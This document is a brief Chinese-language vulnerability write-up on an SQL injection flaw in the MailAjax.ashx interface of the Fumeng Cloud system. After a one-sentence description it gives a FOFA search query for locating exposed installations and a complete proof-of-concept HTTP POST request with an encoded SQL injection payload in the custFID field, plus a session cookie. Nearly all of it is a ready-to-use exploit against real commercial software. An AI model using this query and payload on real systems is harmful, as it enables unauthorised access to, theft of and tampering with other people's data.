# 孚盟云系统接口MailAjax.ashx存在SQL注入漏洞

孚盟云系统接口MailAjax.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="孚盟软件-孚盟云"
```

## poc

```javascript
POST /Ajax/MailAjax.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UserCookie={"LicNo":"","lastLoginIp":"","LicSelected":"cloud","ProductID":"M8","loginUser":"00210","userToken":"A39418D1C5EADEFD41E99B71976A531E24EC2C6B9E7D4CD460A406769A97CC9DE2966975679C521F499A8F215B51B65C4D067F57D94D260B6EF4C16094D56562"}
Connection: close
Content-Type: application/x-www-form-urlencoded

action=GetMailContactsCard&custFID=%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%287588%3D7588%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29
```

